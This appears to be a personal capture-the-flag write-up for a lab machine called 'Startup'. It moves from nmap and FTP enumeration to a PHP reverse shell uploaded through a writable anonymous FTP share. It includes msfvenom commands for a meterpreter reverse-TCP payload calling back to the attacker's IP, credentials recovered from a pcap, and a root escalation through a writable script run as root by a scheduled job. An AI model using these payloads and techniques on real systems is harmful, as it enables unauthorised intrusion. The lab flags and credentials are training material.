---
title: startup
tags:
  - fetus
---
## nmap results: 
- `Dscan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 11:15 EDT
Nmap scan report for 10.10.18.117
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.77 seconds
```
- `Ascan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 11:21 EDT
Warning: 10.10.18.117 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.18.117
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.21.154.145
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 16
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  tcpwrapped
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|_  256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
80/tcp open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   177.86 ms 10.21.0.1
2   177.91 ms 10.10.18.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1166.51 seconds
```
## ftp enum: 
- logged in as `anonymous` and found a directory and 2 files
```sh
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```
- the `ftp` directory has nothing in it/doesnt show anything in it 
- `important.jpg`:
<img src="important.jpg">
- `notice.txt`: 
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
- possible uname found:
```
Maya
```
- gonna run two bruteforces against ftp and ssh and see if we get anything while i enumerate http <br>
![[startupBruteforce.png.png]]
## http enum:
- root source: 
```html
<!doctype html>
<title>Maintenance</title>
<style>
  body { text-align: center; padding: 150px; }
  h1 { font-size: 50px; }
  body { font: 20px Helvetica, sans-serif; color: #333; }
  article { display: block; text-align: left; width: 650px; margin: 0 auto; }
  a { color: #dc8100; text-decoration: none; }
  a:hover { color: #333; text-decoration: none; }
</style>

<article>
    <h1>No spice here!</h1>
    <div>
	<!--when are we gonna update this??-->
        <p>Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, <a href="mailto:#">contact us.</a> Otherwise, don't you worry. We'll be online shortly!</p>
        <p>&mdash; Dev Team</p>
    </div>
</article>
```
- clicking on the link gives us this: <br>
![[startupHttpPopup.png]]
#### dirbusting results: 
- `feroxbuster --url http://10.10.18.117/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```sh
200      GET       20l      113w      808c http://10.10.18.117/
301      GET        9l       28w      312c http://10.10.18.117/files => http://10.10.18.117/files/
200      GET        1l       40w      208c http://10.10.18.117/files/notice.txt
200      GET        0l        0w   251631c http://10.10.18.117/files/important.jpg
```
- the files directory was the same directory as ftp 
- the ftp directory cant be accessed
- im stuck. why did that directory have rwx perms 
## ftp enum 2: 
- since the ftp directory has rwx perms im gonna try and see if i can put anything there
- yay RS.php uploaded
- got a shell as `www-data`
## shell shenanigans:
- `ls`:
```sh
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Apr 15 15:12 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 175 root     root         0 Apr 15 15:12 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       920 Apr 15 15:24 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Apr 15 15:12 sys
drwxrwxrwt   7 root     root      4096 Apr 15 15:47 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
```
- `recipe.txt`:
```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```
- theres a pcap file in the incidents folder, gonna get it with...... you know what im just gonna learn how to get a meterpreter session instead.
#### how to get a meterpreter session: 
- make a payload first using [[msfvenom]]:
	- `msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf -o shell.elf LHOST=10.21.154.145 LPORT=1338` 
- upload it to the target machine and give it proper permissions to run
- set up a listener with [[metasploit]]: 
	- `use exploit/multi/handler` 
		- generic exploit handler, listens for payloads
	- `set payload linux/x86/meterpreter/reverse_tcp`
		- needs to be the same payload we made and uploaded 
	- set the same `LHOST` and `LPORT` 
- run the file 
- HELL YEAH WE GOT A METERPRETER SESSIONNNNNNNNNNN <br>
![[startupMeterpreterSession.png]]
- might as well do some enum as well in meterpreter 
#### post exploitation in meterpreter:
- `use post/linux/gather/enum_modulename` 
- `set session sessionID`
	- check with show sessions 
- `run`
#### aight lets get back to what we were doing 
- got that pcap file. followed the streams, there seems to be a terminal log over tcp on stream 7
- stream7:
```sh fold title:"stream7"
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
ls

bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ 
ls -la

total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
$ 
whoami

www-data
$ 
python -c "import pty;pty.spawn('/bin/bash')"

www-data@startup:/$ 
cd

cd
bash: cd: HOME not set
www-data@startup:/$ 
ls

ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ 
cd home

cd home
www-data@startup:/home$ 
cd lennie

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
ls

ls
lennie
www-data@startup:/home$ 
cd lennie

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
sudo -l

sudo -l
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3


Sorry, try again.
[sudo] password for www-data: 



Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3


sudo: 3 incorrect password attempts
www-data@startup:/home$ 
cat /etc/passwd

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ 
exit

exit
exit
$ 
exit
```
- got creds yaaay: 
```
lennie:c4ntg3t3n0ughsp1c3
```
- lets try to ssh as lennie
## ssh in as lennieeeeeeeeeeeeeeeeee:
- yaaay got in. lets change the pass first 
- got `user.txt`:
```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```
- got a meterpreter session again cuz why not 
- has this stuff in lennie's directory: 
```sh
040700/rwx------  4096  dir   2025-04-15 13:04:42 -0400  .cache
040755/rwxr-xr-x  4096  dir   2020-11-11 23:53:12 -0500  Documents
040755/rwxr-xr-x  4096  dir   2020-11-11 23:54:01 -0500  scripts
100644/rw-r--r--  38    fil   2020-11-11 23:53:12 -0500  user.txt
```
- the `Documents` directory has this stuff: 
```sh
100644/rw-r--r--  139   fil   2020-11-11 23:53:12 -0500  concern.txt
100644/rw-r--r--  47    fil   2020-11-11 23:53:12 -0500  list.txt
100644/rw-r--r--  101   fil   2020-11-11 23:53:12 -0500  note.txt
```
- `concern.txt`: 
```
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
```
- `list.txt`:
```
Shoppinglist: Cyberpunk 2077 | Milk | Dog food
```
- `note.txt`:
```
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
```
- the `scripts` directory had this stuff:
```sh
100755/rwxr-xr-x  77    fil   2020-11-11 23:53:12 -0500  planner.sh
100644/rw-r--r--  1     fil   2025-04-15 13:24:01 -0400  startup_list.txt
```
- `planner.sh`:
```sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
- `planner.sh` output after running:
```sh
./planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied
Done!
```
- `startup_list.txt` had nothing in it
- we ran `pspy64` and saw that `planner.sh` is getting ran as root every 1 minutes 
- and the planner.sh is running `print.sh` as root
- if we check the permissions for `print.sh`:
```sh
100700/rwx------  16  fil  2025-04-15 14:46:40 -0400  /etc/print.sh
```
- we got `rwx` perms for `print.sh`
- we dont have any perms for `planner.sh` although that doesnt matter at this point 
## priv esc to root
- SOOOOOOOOOOOOOOOOO we got a file we have full access to that gets ran as root every one minutes 
- i just `echo`'d `/tmp/shell5.elf` into `/etc/print.sh` (i created another payload called `shell5.elf`with [[msfvenom]] and uploaded it at `/tmp` that listens on a different port than the one the current meterpreter session is using)
- and then i ran another listener in [[metasploit]] that listens on that port 
- and one minute later we got rooooooooooooooooooooooottttttttt <br>
![[startupHasBeenRooted.png]]
- `root.txt`:
```
THM{f963aaa6a430f210222158ae15c3d76d}
```